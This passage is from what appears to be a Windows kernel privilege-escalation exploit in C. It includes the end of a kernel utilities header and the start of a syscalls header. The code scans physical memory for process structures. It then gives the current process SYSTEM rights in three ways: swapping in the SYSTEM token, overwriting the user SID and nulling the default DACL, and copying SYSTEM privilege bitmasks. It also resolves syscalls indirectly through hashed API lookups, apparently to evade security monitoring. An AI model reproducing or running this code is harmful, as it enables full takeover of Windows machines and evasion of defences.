        DWORD64 regionEnd = regionStart + 0x100000ULL;
        if (regionEnd > maxPhys) regionEnd = maxPhys;
        SCAN_REGION(regionStart, regionEnd);
    }

    printf("[*] Phase 3: Scanning %d warm regions...\n", warmCount);
    for (int w = 0; w < warmCount; w++) {
        DWORD64 regionStart = warmRegions[w];
        DWORD64 regionEnd = regionStart + 0x100000ULL;
        if (regionEnd > maxPhys) regionEnd = maxPhys;
        SCAN_REGION(regionStart, regionEnd);
    }

    printf("[*] Phase 4: Full scan of remaining high memory...\n");

    for (DWORD64 offset = 0x40000000ULL; offset < maxPhys - 0x600; offset += 0x40) {
        if ((offset & 0x3FFFFFFF) == 0) {
            DWORD elapsed = GetTickCount() - startTime;
            printf("    [*] Scanning 0x%llx (%llu GB), checked %llu, %u ms\n",
                   offset, offset >> 30, checked, elapsed);
        }

        __try {
            DWORD64 flink = *(DWORD64*)(physMemMap + offset + offsets->EprocessActiveProcessLinks);
            if ((flink >> 48) != 0xFFFF) continue;
            if (flink == 0xFFFFFFFFFFFFFFFFULL) continue;

            checked++;

            DWORD pid = *(DWORD*)(physMemMap + offset + offsets->EprocessUniqueProcessId);
            if (pid != targetPID) continue;

            pidMatches++;

            DWORD64 blink = *(DWORD64*)(physMemMap + offset + offsets->EprocessActiveProcessLinks + 8);
            if ((blink >> 48) != 0xFFFF) continue;

            DWORD64 token = *(DWORD64*)(physMemMap + offset + offsets->EprocessToken);
            if ((token >> 48) != 0xFFFF) continue;

            char imageFileName[16] = {0};
            memcpy(imageFileName, physMemMap + offset + offsets->EprocessImageFileName, 15);

            if (targetPID == 4 && _strnicmp(imageFileName, "System", 6) != 0) continue;
            if (targetPID != 4 && imageFileName[0] < ' ') continue;

            DWORD elapsed = GetTickCount() - startTime;
            printf("[+] Found EPROCESS at physical 0x%llx in %u ms (full scan)\n", offset, elapsed);
            printf("    PID: %u, Name: %.15s\n", pid, imageFileName);
            return offset;

        } __except(EXCEPTION_EXECUTE_HANDLER) { continue; }
    }

    printf("[*] Phase 5: Fallback scan (low memory 0-1GB)...\n");

    for (DWORD64 offset = 0; offset < 0x40000000ULL && offset < maxPhys - 0x600; offset += 0x40) {
        __try {
            DWORD64 flink = *(DWORD64*)(physMemMap + offset + offsets->EprocessActiveProcessLinks);
            if ((flink >> 48) != 0xFFFF || flink == 0xFFFFFFFFFFFFFFFFULL) continue;

            checked++;

            DWORD pid = *(DWORD*)(physMemMap + offset + offsets->EprocessUniqueProcessId);
            if (pid != targetPID) continue;

            DWORD64 blink = *(DWORD64*)(physMemMap + offset + offsets->EprocessActiveProcessLinks + 8);
            if ((blink >> 48) != 0xFFFF) continue;

            DWORD64 token = *(DWORD64*)(physMemMap + offset + offsets->EprocessToken);
            if ((token >> 48) != 0xFFFF) continue;

            DWORD elapsed = GetTickCount() - startTime;
            printf("[+] Found EPROCESS at physical 0x%llx in %u ms (low memory)\n", offset, elapsed);
            return offset;

        } __except(EXCEPTION_EXECUTE_HANDLER) { continue; }
    }

    #undef SCAN_REGION

    DWORD elapsed = GetTickCount() - startTime;
    printf("[-] EPROCESS not found in %u ms (checked %llu, PID matches %llu)\n", elapsed, checked, pidMatches);
    return 0;
}

static DWORD64 V2PWithDTBFallback(DWORD64 vaddr, BYTE* physMemMap, DWORD64 maxPhys,
                                   DWORD64 primaryCR3, DWORD64 systemEprocessPhys,
                                   KERNEL_OFFSETS* offsets) {
    DWORD64 result = VirtualToPhysical(primaryCR3, vaddr, physMemMap, maxPhys);
    if (result && result < maxPhys) return result;

    if (systemEprocessPhys && systemEprocessPhys + offsets->EprocessDirectoryTableBase + 8 < maxPhys) {
        DWORD64 systemDTB = *(DWORD64*)(physMemMap + systemEprocessPhys + offsets->EprocessDirectoryTableBase);
        systemDTB &= 0xFFFFFFFFF000ULL;  // Mask out PCID bits
        if (systemDTB && systemDTB != primaryCR3 && systemDTB < maxPhys) {
            result = VirtualToPhysical(systemDTB, vaddr, physMemMap, maxPhys);
            if (result && result < maxPhys) return result;
        }
    }
    return 0;
}

// Technique 1: Token Stealing (Physical)
static BOOL TokenStealingPhysical(BYTE* physMemMap, DWORD64 cr3, DWORD64 maxPhys, KERNEL_OFFSETS* offsets, pNtQuerySystemInformation_t fnNtQSI, DWORD64* pOriginalToken) {
    printf("[*] TokenStealingPhysical: Locating System EPROCESS...\n");
    DWORD64 systemEPROCESS = FindSystemEPROCESSPhysical(physMemMap, cr3, maxPhys, offsets, fnNtQSI);
    if (!systemEPROCESS) {
        printf("[-] TokenStealingPhysical: Failed to find System EPROCESS\n");
        return FALSE;
    }
    printf("[+] TokenStealingPhysical: System EPROCESS at 0x%llx\n", systemEPROCESS);

    DWORD64 systemPhys = VirtualToPhysical(cr3, systemEPROCESS, physMemMap, maxPhys);
    if (!systemPhys) {
        printf("[-] TokenStealingPhysical: Failed to translate System EPROCESS to physical address\n");
        return FALSE;
    }
    printf("[+] TokenStealingPhysical: System EPROCESS physical at 0x%llx\n", systemPhys);

    DWORD64 systemToken = *(DWORD64*)(physMemMap + systemPhys + offsets->EprocessToken);
    DWORD64 systemTokenObj = systemToken & 0xFFFFFFFFFFFFFFF0ULL;
    printf("[+] TokenStealingPhysical: System Token: 0x%llx (Object: 0x%llx)\n", systemToken, systemTokenObj);

    DWORD currentPID = GetCurrentProcessId();
    printf("[*] TokenStealingPhysical: Locating current process (PID %d)...\n", currentPID);

    // Attempt 1: BigPool scan (Most reliable for pooled objects like EPROCESS)
    DWORD64 currentEPROCESS = FindProcessInBigPoolPhysical(physMemMap, cr3, maxPhys, offsets, fnNtQSI, currentPID);

    // Attempt 2: Process list walk (System context)
    if (!currentEPROCESS) {
        printf("[*] TokenStealingPhysical: BigPool scan failed, trying process list walk...\n");
        currentEPROCESS = FindProcessInListPhysical(physMemMap, cr3, maxPhys, systemEPROCESS, currentPID, offsets);
    }

    DWORD64 currentPhys = 0;
    if (currentEPROCESS) {
        printf("[+] TokenStealingPhysical: Found current EPROCESS at 0x%llx\n", currentEPROCESS);
        currentPhys = VirtualToPhysical(cr3, currentEPROCESS, physMemMap, maxPhys);
    } else {
        printf("[*] TokenStealingPhysical: List walk failed, falling back to physical scan...\n");
        currentPhys = ScanPhysicalForEPROCESS(physMemMap, maxPhys, currentPID, offsets);
    }

    if (!currentPhys) {
        printf("[-] TokenStealingPhysical: Failed to find current process EPROCESS in physical memory\n");
        return FALSE;
    }
    printf("[+] TokenStealingPhysical: Current process physical at 0x%llx\n", currentPhys);

    if (pOriginalToken) {
        *pOriginalToken = *(DWORD64*)(physMemMap + currentPhys + offsets->EprocessToken);
        printf("[*] TokenStealingPhysical: Original token saved: 0x%llx\n", *pOriginalToken);
    }

    printf("[*] Technique 1: Token Stealing (Physical)\n");

    // Increment token reference count before stealing (at offset 0x18 in _EX_FAST_REF)
    DWORD64 systemTokenPhys = VirtualToPhysical(cr3, systemTokenObj, physMemMap, maxPhys);
    if (systemTokenPhys) {
        // Token object has reference count at offset 0x18 (_OBJECT_HEADER.PointerCount)
        // We need to increment it since we're creating another reference
        DWORD64 refCountOffset = systemTokenPhys - 0x30 + 0x18; // _OBJECT_HEADER is 0x30 bytes before object
        if (refCountOffset < maxPhys) {
            LONG* pRefCount = (LONG*)(physMemMap + refCountOffset);
            LONG oldRefCount = *pRefCount;
            (*pRefCount)++;
            printf("[*] TokenStealingPhysical: Incremented token refcount: %d -> %d\n", oldRefCount, *pRefCount);
        }
    }

    // Write the token with proper memory barriers
    volatile DWORD64* pTokenSlot = (volatile DWORD64*)(physMemMap + currentPhys + offsets->EprocessToken);
    *pTokenSlot = systemToken;

    // Force memory barrier and cache flush
    MemoryBarrier();
    _mm_mfence();

    // Verify the write
    DWORD64 verifyToken = *(DWORD64*)(physMemMap + currentPhys + offsets->EprocessToken);
    if (verifyToken == systemToken) {
        printf("[+] TokenStealingPhysical: Token overwritten and verified (0x%llx)\n", verifyToken);
    } else {
        printf("[-] TokenStealingPhysical: Token verification failed (expected 0x%llx, got 0x%llx)\n",
               systemToken, verifyToken);
        return FALSE;
    }

    // Trigger a context switch to ensure the new token is picked up
    Sleep(10);

    return TRUE;
}

// Technique 2: ACL-ACE & Identity Editing (Physical)
static BOOL ACLACEEditingPhysical(BYTE* physMemMap, DWORD64 cr3, DWORD64 maxPhys, KERNEL_OFFSETS* offsets, pNtQuerySystemInformation_t fnNtQSI) {
    printf("[*] Technique 2: ACL-ACE & Identity Hijacking (Physical)\n");

    DWORD currentPID = GetCurrentProcessId();

    DWORD64 systemEPROCESS = FindSystemEPROCESSPhysical(physMemMap, cr3, maxPhys, offsets, fnNtQSI);
    if (!systemEPROCESS) {
        printf("[-] Failed to find System EPROCESS\n");
        return FALSE;
    }
    printf("[+] System EPROCESS: 0x%llx\n", systemEPROCESS);

    DWORD64 systemPhys = V2PWithDTBFallback(systemEPROCESS, physMemMap, maxPhys, cr3, 0, offsets);
    if (!systemPhys) {
        systemPhys = ScanPhysicalForEPROCESS(physMemMap, maxPhys, 4, offsets);
    }

    DWORD64 currentEPROCESS = FindProcessInBigPoolPhysical(physMemMap, cr3, maxPhys, offsets, fnNtQSI, currentPID);
    if (!currentEPROCESS) {
        currentEPROCESS = FindProcessInListPhysical(physMemMap, cr3, maxPhys, systemEPROCESS, currentPID, offsets);
    }

    DWORD64 currentPhys = 0;
    if (currentEPROCESS) {
        currentPhys = V2PWithDTBFallback(currentEPROCESS, physMemMap, maxPhys, cr3, systemPhys, offsets);
    }
    if (!currentPhys) {
        currentPhys = ScanPhysicalForEPROCESS(physMemMap, maxPhys, currentPID, offsets);
    }

    if (!currentPhys || currentPhys >= maxPhys) {
        printf("[-] Failed to find current process\n");
        return FALSE;
    }
    printf("[+] Current process physical: 0x%llx\n", currentPhys);

    DWORD64 tokenValue = *(DWORD64*)(physMemMap + currentPhys + offsets->EprocessToken);
    DWORD64 tokenAddr = tokenValue & 0xFFFFFFFFFFFFFFF0ULL;

    if (!IsValidKernelAddress(tokenAddr)) {
        printf("[-] Invalid token address: 0x%llx\n", tokenAddr);
        return FALSE;
    }

    DWORD64 tokenPhys = V2PWithDTBFallback(tokenAddr, physMemMap, maxPhys, cr3, systemPhys, offsets);
    if (!tokenPhys || tokenPhys >= maxPhys) {
        printf("[-] Failed to translate token address 0x%llx\n", tokenAddr);
        return FALSE;
    }
    printf("[+] Token physical: 0x%llx\n", tokenPhys);

    // Step 1: Read UserAndGroups pointer (points to SID_AND_ATTRIBUTES array)
    DWORD64 userAndGroupsArrayPtr = *(DWORD64*)(physMemMap + tokenPhys + offsets->TokenUserAndGroups);

    if (!IsValidKernelAddress(userAndGroupsArrayPtr)) {
        printf("[-] Invalid UserAndGroups pointer: 0x%llx\n", userAndGroupsArrayPtr);
        return FALSE;
    }

    DWORD64 userAndGroupsArrayPhys = V2PWithDTBFallback(userAndGroupsArrayPtr, physMemMap, maxPhys, cr3, systemPhys, offsets);
    if (!userAndGroupsArrayPhys || userAndGroupsArrayPhys >= maxPhys) {
        printf("[-] Failed to translate UserAndGroups array\n");
        return FALSE;
    }
    printf("[+] UserAndGroups array physical: 0x%llx\n", userAndGroupsArrayPhys);

    // Step 2: Read first SID_AND_ATTRIBUTES entry (offset 0x00 = Sid pointer, 0x08 = Attributes)
    // SID_AND_ATTRIBUTES structure:
    //   +0x00: PSID Sid
    //   +0x08: ULONG Attributes
    DWORD64 userSidPtr = *(DWORD64*)(physMemMap + userAndGroupsArrayPhys);

    if (!IsValidKernelAddress(userSidPtr)) {
        printf("[-] Invalid User SID pointer: 0x%llx\n", userSidPtr);
        return FALSE;
    }

    DWORD64 userSidPhys = V2PWithDTBFallback(userSidPtr, physMemMap, maxPhys, cr3, systemPhys, offsets);
    if (!userSidPhys || userSidPhys >= maxPhys - 12) {
        printf("[-] Failed to translate User SID address\n");
        return FALSE;
    }
    printf("[+] User SID physical: 0x%llx\n", userSidPhys);

    DWORD64 currentSidData = *(DWORD64*)(physMemMap + userSidPhys);
    printf("[*] Current SID data: 0x%llx\n", currentSidData);

    BYTE revision = (BYTE)(currentSidData & 0xFF);
    BYTE subAuthCount = (BYTE)((currentSidData >> 8) & 0xFF);

    if (revision != 1 || subAuthCount == 0 || subAuthCount > 15) {
        printf("[!] Warning: SID structure looks invalid (Rev=%d, SubAuth=%d)\n", revision, subAuthCount);
        printf("[!] Proceeding anyway - this may crash\n");
    }

    // Step 4: Overwrite with SYSTEM SID (S-1-5-18)
    // SID structure for S-1-5-18:
    //   Revision: 1
    //   SubAuthorityCount: 1
    //   IdentifierAuthority: {0,0,0,0,0,5} (SECURITY_NT_AUTHORITY)
    //   SubAuthority[0]: 18 (SECURITY_LOCAL_SYSTEM_RID)
    //
    // In memory (little-endian):
    //   Bytes 0-7:  01 01 00 00 00 00 00 05 = 0x0500000000000101
    //   Bytes 8-11: 12 00 00 00             = 0x00000012

    printf("[*] Overwriting User SID with SYSTEM SID (S-1-5-18)...\n");

    *(DWORD64*)(physMemMap + userSidPhys) = 0x0500000000000101ULL;
    *(DWORD*)(physMemMap + userSidPhys + 8) = 0x00000012;

    printf("[+] SID overwritten successfully\n");

    printf("[*] Nulling DefaultDacl at token+0x%X...\n", offsets->TokenDefaultDacl);
    *(DWORD64*)(physMemMap + tokenPhys + offsets->TokenDefaultDacl) = 0;

    printf("[+] ACL and Identity modified successfully!\n");
    return TRUE;
}

// Technique 3: Privilege Manipulation (Physical)
static BOOL PrivilegeManipulationPhysical(BYTE* physMemMap, DWORD64 cr3, DWORD64 maxPhys, KERNEL_OFFSETS* offsets, pNtQuerySystemInformation_t fnNtQSI) {
    printf("[*] Technique 3: Privilege Manipulation (Physical)\n");

    DWORD currentPID = GetCurrentProcessId();

    DWORD64 systemEPROCESS = FindSystemEPROCESSPhysical(physMemMap, cr3, maxPhys, offsets, fnNtQSI);
    if (!systemEPROCESS) {
        printf("[-] Failed to find System EPROCESS\n");
        return FALSE;
    }
    printf("[+] System EPROCESS: 0x%llx\n", systemEPROCESS);

    DWORD64 systemPhys = V2PWithDTBFallback(systemEPROCESS, physMemMap, maxPhys, cr3, 0, offsets);
    if (!systemPhys) {
        systemPhys = ScanPhysicalForEPROCESS(physMemMap, maxPhys, 4, offsets);
    }
    if (!systemPhys || systemPhys >= maxPhys) {
        printf("[-] Failed to translate System EPROCESS\n");
        return FALSE;
    }

    DWORD64 systemTokenValue = *(DWORD64*)(physMemMap + systemPhys + offsets->EprocessToken);
    DWORD64 systemTokenAddr = systemTokenValue & 0xFFFFFFFFFFFFFFF0ULL;

    if (!IsValidKernelAddress(systemTokenAddr)) {
        printf("[-] Invalid System token address\n");
        return FALSE;
    }

    DWORD64 systemTokenPhys = V2PWithDTBFallback(systemTokenAddr, physMemMap, maxPhys, cr3, systemPhys, offsets);
    if (!systemTokenPhys || systemTokenPhys >= maxPhys) {
        printf("[-] Failed to translate System token\n");
        return FALSE;
    }
    printf("[+] System token physical: 0x%llx\n", systemTokenPhys);

    // Read System privileges (SEP_TOKEN_PRIVILEGES structure - 24 bytes)
    // Offset 0x40 from TOKEN base:
    //   +0x00: Present (QWORD) - privileges that exist
    //   +0x08: Enabled (QWORD) - privileges that are enabled
    //   +0x10: EnabledByDefault (QWORD) - default enabled

    DWORD64 sysPrivsPhys = systemTokenPhys + offsets->TokenPrivileges;
    if (sysPrivsPhys + 24 >= maxPhys) {
        printf("[-] System privileges offset out of bounds\n");
        return FALSE;
    }

    DWORD64 sysPrivsPresent = *(DWORD64*)(physMemMap + sysPrivsPhys);
    DWORD64 sysPrivsEnabled = *(DWORD64*)(physMemMap + sysPrivsPhys + 8);
    DWORD64 sysPrivsDefault = *(DWORD64*)(physMemMap + sysPrivsPhys + 16);

    printf("[+] System privileges: Present=0x%llx, Enabled=0x%llx\n", sysPrivsPresent, sysPrivsEnabled);

    DWORD64 currentEPROCESS = FindProcessInBigPoolPhysical(physMemMap, cr3, maxPhys, offsets, fnNtQSI, currentPID);
    if (!currentEPROCESS) {
        currentEPROCESS = FindProcessInListPhysical(physMemMap, cr3, maxPhys, systemEPROCESS, currentPID, offsets);
    }

    DWORD64 currentPhys = 0;
    if (currentEPROCESS) {
        currentPhys = V2PWithDTBFallback(currentEPROCESS, physMemMap, maxPhys, cr3, systemPhys, offsets);
    }
    if (!currentPhys) {
        currentPhys = ScanPhysicalForEPROCESS(physMemMap, maxPhys, currentPID, offsets);
    }

    if (!currentPhys || currentPhys >= maxPhys) {
        printf("[-] Failed to find current process\n");
        return FALSE;
    }
    printf("[+] Current process physical: 0x%llx\n", currentPhys);

    DWORD64 tokenValue = *(DWORD64*)(physMemMap + currentPhys + offsets->EprocessToken);
    DWORD64 tokenAddr = tokenValue & 0xFFFFFFFFFFFFFFF0ULL;

    if (!IsValidKernelAddress(tokenAddr)) {
        printf("[-] Invalid current token address\n");
        return FALSE;
    }

    DWORD64 tokenPhys = V2PWithDTBFallback(tokenAddr, physMemMap, maxPhys, cr3, systemPhys, offsets);
    if (!tokenPhys || tokenPhys >= maxPhys) {
        printf("[-] Failed to translate current token\n");
        return FALSE;
    }
    printf("[+] Current token physical: 0x%llx\n", tokenPhys);

    DWORD64 curPrivsPhys = tokenPhys + offsets->TokenPrivileges;
    if (curPrivsPhys + 24 >= maxPhys) {
        printf("[-] Current privileges offset out of bounds\n");
        return FALSE;
    }

    DWORD64 curPrivsPresent = *(DWORD64*)(physMemMap + curPrivsPhys);
    DWORD64 curPrivsEnabled = *(DWORD64*)(physMemMap + curPrivsPhys + 8);
    printf("[*] Current privileges: Present=0x%llx, Enabled=0x%llx\n", curPrivsPresent, curPrivsEnabled);

    printf("[*] Injecting SYSTEM privileges...\n");

    *(DWORD64*)(physMemMap + curPrivsPhys) = sysPrivsPresent;
    *(DWORD64*)(physMemMap + curPrivsPhys + 8) = sysPrivsEnabled;
    *(DWORD64*)(physMemMap + curPrivsPhys + 16) = sysPrivsDefault;

    printf("[+] Privileges injected successfully!\n");
    printf("[+] Privilege manipulation complete!\n");

    return TRUE;
}

static BOOL ApplyLPEPhysical(BYTE* physMemMap, DWORD64 cr3, DWORD64 maxPhys, KERNEL_OFFSETS* offsets, pNtQuerySystemInformation_t fnNtQSI, LPE_TECHNIQUE technique, DWORD64* pOriginalToken) {
    switch (technique) {
        case TECHNIQUE_TOKEN_STEALING:
            return TokenStealingPhysical(physMemMap, cr3, maxPhys, offsets, fnNtQSI, pOriginalToken);
        case TECHNIQUE_ACL_EDITING:
            return ACLACEEditingPhysical(physMemMap, cr3, maxPhys, offsets, fnNtQSI);
        case TECHNIQUE_PRIVILEGE_MANIPULATION:
            return PrivilegeManipulationPhysical(physMemMap, cr3, maxPhys, offsets, fnNtQSI);
        default:
            return FALSE;
    }
}

static BOOL VerifyEPROCESSOffsets(DWORD64 systemEPROCESS, KERNEL_OFFSETS* offsets) {
    DWORD pid = 0;
    if (KernelRead32(systemEPROCESS + offsets->EprocessUniqueProcessId, &pid) && pid == 4) {
        DWORD64 flink = 0;
        if (KernelRead64(systemEPROCESS + offsets->EprocessActiveProcessLinks, &flink) && IsValidKernelAddress(flink)) {
            printf("[+] Static offsets verified (PID=4 at 0x%X)\n", offsets->EprocessUniqueProcessId);
            return TRUE;
        }
    }

    printf("[!] Static offsets failed, attempting dynamic resolution...\n");
    if (!DynamicOffsetResolution(systemEPROCESS, offsets)) return FALSE;

    pid = 0;
    if (!KernelRead32(systemEPROCESS + offsets->EprocessUniqueProcessId, &pid) || pid != 4) return FALSE;

    DWORD64 flink = 0;
    if (!KernelRead64(systemEPROCESS + offsets->EprocessActiveProcessLinks, &flink) || !IsValidKernelAddress(flink)) return FALSE;

    return TRUE;
}

// Technique 1: Token Stealing
static BOOL TokenStealing(DWORD64 kernelBase, KERNEL_OFFSETS* offsets, DWORD64* pOriginalToken) {
    DWORD currentPID = GetCurrentProcessId();

    DWORD64 systemEPROCESS = FindPsInitialSystemProcess(kernelBase);
    if (!systemEPROCESS) return FALSE;

    printf("[*] Technique 1: Token Stealing\n");
    printf("    System EPROCESS:              0x%llx\n", systemEPROCESS);

    if (!VerifyEPROCESSOffsets(systemEPROCESS, offsets)) return FALSE;

    DWORD64 currentEPROCESS = FindEPROCESSByPID(systemEPROCESS, currentPID, offsets);
    if (!currentEPROCESS) return FALSE;

    printf("    Current EPROCESS (PID %d):    0x%llx\n", currentPID, currentEPROCESS);

    DWORD64 systemToken = 0;
    if (!KernelRead64(systemEPROCESS + offsets->EprocessToken, &systemToken)) return FALSE;

    DWORD64 tokenPtr = systemToken & 0xFFFFFFFFFFFFFFF0ULL;
    DWORD refCount = (DWORD)(systemToken & 0xF);
    if (!IsValidKernelAddress(tokenPtr) || refCount == 0 || refCount > 15) {
        printf("    [-] Invalid token value: 0x%llx (ptr=0x%llx, ref=%u)\n", systemToken, tokenPtr, refCount);
        return FALSE;
    }

    printf("    System Token:                 0x%llx\n", systemToken);

    DWORD64 currentToken = 0;
    if (!KernelRead64(currentEPROCESS + offsets->EprocessToken, &currentToken)) return FALSE;

    printf("    Current Token:                0x%llx\n", currentToken);

    if (pOriginalToken) *pOriginalToken = currentToken;

    DWORD64 tokenObj = systemToken & 0xFFFFFFFFFFFFFFF0ULL;
    DWORD64 tokenObjectHeader = tokenObj - 0x30;

    if (IsValidKernelAddress(tokenObjectHeader)) {
        DWORD refCount = 0;
        if (KernelRead32(tokenObjectHeader + 0x18, &refCount)) {
            DWORD newRefCount = refCount + 1;
            if (newRefCount > refCount && newRefCount < 0x10000) {
                KernelWrite32(tokenObjectHeader + 0x18, newRefCount);
            }
        }
    }

    DWORD64 existingToken = 0;
    if (!KernelRead64(currentEPROCESS + offsets->EprocessToken, &existingToken) || !IsValidKernelAddress(existingToken & 0xFFFFFFFFFFFFFFF0ULL)) {
        printf("    [-] Target EPROCESS token field is invalid, aborting write\n");
        return FALSE;
    }

    if (!KernelWrite64(currentEPROCESS + offsets->EprocessToken, systemToken)) return FALSE;

    printf("    [+] Token stolen successfully!\n");
    return TRUE;
}

// Technique 2: ACL-ACE & Identity Hijacking
static BOOL ACLACEEditing(DWORD64 kernelBase, KERNEL_OFFSETS* offsets) {
    DWORD currentPID = GetCurrentProcessId();
    DWORD64 systemEPROCESS = FindPsInitialSystemProcess(kernelBase);
    if (!systemEPROCESS) return FALSE;

    if (!VerifyEPROCESSOffsets(systemEPROCESS, offsets)) return FALSE;

    DWORD64 currentEPROCESS = FindEPROCESSByPID(systemEPROCESS, currentPID, offsets);
    if (!currentEPROCESS) return FALSE;

    printf("[*] Technique 2: ACL-ACE & Identity Hijacking\n");

    DWORD64 tokenValue = 0;
    if (!KernelRead64(currentEPROCESS + offsets->EprocessToken, &tokenValue)) {
        printf("    [-] Failed to read current token\n");
        return FALSE;
    }
    DWORD64 tokenAddr = tokenValue & 0xFFFFFFFFFFFFFFF0ULL;
    if (!IsValidKernelAddress(tokenAddr)) {
        printf("    [-] Invalid token address: 0x%llx\n", tokenAddr);
        return FALSE;
    }

    DWORD64 currentArrayAddr = 0;
    if (!KernelRead64(tokenAddr + offsets->TokenUserAndGroups, &currentArrayAddr) || !IsValidKernelAddress(currentArrayAddr)) {
        printf("    [-] Failed to read UserAndGroups at token+0x%X\n", offsets->TokenUserAndGroups);
        return FALSE;
    }

    DWORD64 currentUserSidPtr = 0;
    if (!KernelRead64(currentArrayAddr, &currentUserSidPtr) || !IsValidKernelAddress(currentUserSidPtr)) {
        printf("    [-] Failed to read SID pointer from UserAndGroups\n");
        return FALSE;
    }

    printf("[*] Overwriting User SID data at 0x%llx with SYSTEM SID...\n", currentUserSidPtr);

    if (!KernelWrite64(currentUserSidPtr, 0x0500000000000101ULL)) return FALSE;
    if (!KernelWrite32(currentUserSidPtr + 8, 0x00000012)) return FALSE;

    printf("[*] Nulling DefaultDacl at offset 0x%X...\n", offsets->TokenDefaultDacl);
    if (!KernelWrite64(tokenAddr + offsets->TokenDefaultDacl, 0)) return FALSE;

    printf("    [+] ACL and Identity modified successfully!\n");
    return TRUE;
}

// Technique 3: Privilege Manipulation
static BOOL PrivilegeManipulation(DWORD64 kernelBase, KERNEL_OFFSETS* offsets) {
    DWORD currentPID = GetCurrentProcessId();
    DWORD64 systemEPROCESS = FindPsInitialSystemProcess(kernelBase);
    if (!systemEPROCESS) return FALSE;

    if (!VerifyEPROCESSOffsets(systemEPROCESS, offsets)) {
        printf("    [!] Warning: EPROCESS offset verification failed - proceeding with defaults\n");
    }

    DWORD64 currentEPROCESS = FindEPROCESSByPID(systemEPROCESS, currentPID, offsets);
    if (!currentEPROCESS) return FALSE;

    printf("[*] Technique 3: Privilege Manipulation\n");

    DWORD64 systemTokenValue = 0;
    if (!KernelRead64(systemEPROCESS + offsets->EprocessToken, &systemTokenValue)) return FALSE;
    DWORD64 systemTokenAddr = systemTokenValue & 0xFFFFFFFFFFFFFFF0ULL;

    DWORD64 sysPrivs[3];
    if (!KernelRead64(systemTokenAddr + offsets->TokenPrivileges, &sysPrivs[0])) return FALSE;
    if (!KernelRead64(systemTokenAddr + offsets->TokenPrivileges + 8, &sysPrivs[1])) return FALSE;
    if (!KernelRead64(systemTokenAddr + offsets->TokenPrivileges + 16, &sysPrivs[2])) return FALSE;

    DWORD64 tokenValue = 0;
    if (!KernelRead64(currentEPROCESS + offsets->EprocessToken, &tokenValue)) return FALSE;
    DWORD64 tokenAddr = tokenValue & 0xFFFFFFFFFFFFFFF0ULL;

    printf("[*] Copying SYSTEM privilege bitmask (0x%llx) to current process...\n", sysPrivs[0]);

    DWORD64 privsAddr = tokenAddr + offsets->TokenPrivileges;
    if (!KernelWrite64(privsAddr, sysPrivs[0])) return FALSE;      // Present
    if (!KernelWrite64(privsAddr + 8, sysPrivs[1])) return FALSE;   // Enabled
    if (!KernelWrite64(privsAddr + 16, sysPrivs[2])) return FALSE;  // EnabledByDefault

    printf("    [+] Privileges enabled from System Token\n");
    printf("    [+] Privilege manipulation successful!\n");
    return TRUE;
}

static BOOL ApplyLPE(DWORD64 kernelBase, KERNEL_OFFSETS* offsets, LPE_TECHNIQUE technique, DWORD64* pOriginalToken) {
    switch (technique) {
        case TECHNIQUE_TOKEN_STEALING:
            return TokenStealing(kernelBase, offsets, pOriginalToken);
        case TECHNIQUE_ACL_EDITING:
            return ACLACEEditing(kernelBase, offsets);
        case TECHNIQUE_PRIVILEGE_MANIPULATION:
            return PrivilegeManipulation(kernelBase, offsets);
        default:
            printf("[-] Unknown LPE technique: %d\n", technique);
            return FALSE;
    }
}

// StealSystemToken is an alias kept for call-site compatibility
#define StealSystemToken(base, off, tok) TokenStealing((base), (off), (tok))

#endif // KERNEL_UTILS_H
```

#### syscalls.h

```c
// headers\syscalls.h
#ifndef SYSCALLS_H
#define SYSCALLS_H

#include "exploit_common.h"
#include <stdio.h>

typedef NTSTATUS (NTAPI *pNtCreateFile_t)(PHANDLE, ACCESS_MASK, POBJECT_ATTRIBUTES, PIO_STATUS_BLOCK, PLARGE_INTEGER, ULONG, ULONG, ULONG, ULONG, PVOID, ULONG);
typedef NTSTATUS (NTAPI *pNtDeviceIoControlFile_t)(HANDLE, HANDLE, PIO_APC_ROUTINE, PVOID, PIO_STATUS_BLOCK, ULONG, PVOID, ULONG, PVOID, ULONG);
typedef NTSTATUS (NTAPI *pRtlGetVersion_t)(PRTL_OSVERSIONINFOW);
typedef NTSTATUS (NTAPI *pNtQuerySystemInformation_t)(ULONG, PVOID, ULONG, PULONG);

#ifdef SYSCALLS_IMPLEMENTATION
pNtCreateFile_t g_fnNtCreateFile = NULL;
pNtDeviceIoControlFile_t g_fnNtDeviceIoControlFile = NULL;
pRtlGetVersion_t g_fnRtlGetVersion = NULL;
pNtQuerySystemInformation_t g_fnNtQuerySystemInformation = NULL;

SYSCALL_ENTRY g_Syscall_NtCreateFile = {0};
SYSCALL_ENTRY g_Syscall_NtDeviceIoControlFile = {0};
SYSCALL_ENTRY g_Syscall_NtQuerySystemInformation = {0};
#else
extern pNtCreateFile_t g_fnNtCreateFile;
extern pNtDeviceIoControlFile_t g_fnNtDeviceIoControlFile;
extern pRtlGetVersion_t g_fnRtlGetVersion;
extern pNtQuerySystemInformation_t g_fnNtQuerySystemInformation;

extern SYSCALL_ENTRY g_Syscall_NtCreateFile;
extern SYSCALL_ENTRY g_Syscall_NtDeviceIoControlFile;
extern SYSCALL_ENTRY g_Syscall_NtQuerySystemInformation;
#endif

static NTSTATUS ExecuteIndirectSyscall(SYSCALL_ENTRY* entry, PVOID arg1, PVOID arg2, PVOID arg3, PVOID arg4, PVOID arg5, PVOID arg6, PVOID arg7, PVOID arg8, PVOID arg9, PVOID arg10) {
    if (!entry->resolved) return STATUS_UNSUCCESSFUL;

    typedef NTSTATUS (NTAPI *SyscallFunc)(PVOID, PVOID, PVOID, PVOID, PVOID, PVOID, PVOID, PVOID, PVOID, PVOID);

    SyscallFunc syscallFunc = (SyscallFunc)entry->syscallAddr;

    return syscallFunc(arg1, arg2, arg3, arg4, arg5, arg6, arg7, arg8, arg9, arg10);
}

static BOOL ResolveSyscall(const char* funcName, SYSCALL_ENTRY* entry) {
    HMODULE hNtdll = GetNtdllHandleFromPEB();
    if (!hNtdll) return FALSE;

    DWORD hash = HashAPI(funcName);
    PVOID funcAddr = ResolveAPI(hNtdll, hash);
    if (!funcAddr) return FALSE;

    BYTE* code = (BYTE*)funcAddr;

    if (code[0] == 0x4C && code[1] == 0x8B && code[2] == 0xD1) {
        if (code[3] == 0xB8) {
            entry->ssn = *(DWORD*)(code + 4);

            for (int i = 8; i < 32; i++) {
                if ((code[i] == 0x0F && code[i+1] == 0x05) ||
                    (code[i] == 0x48 && code[i+1] == 0x0F && code[i+2] == 0x05)) {
                    entry->syscallAddr = (PVOID)funcAddr;
                    entry->resolved = TRUE;
                    return TRUE;
                }
            }
        }
    }

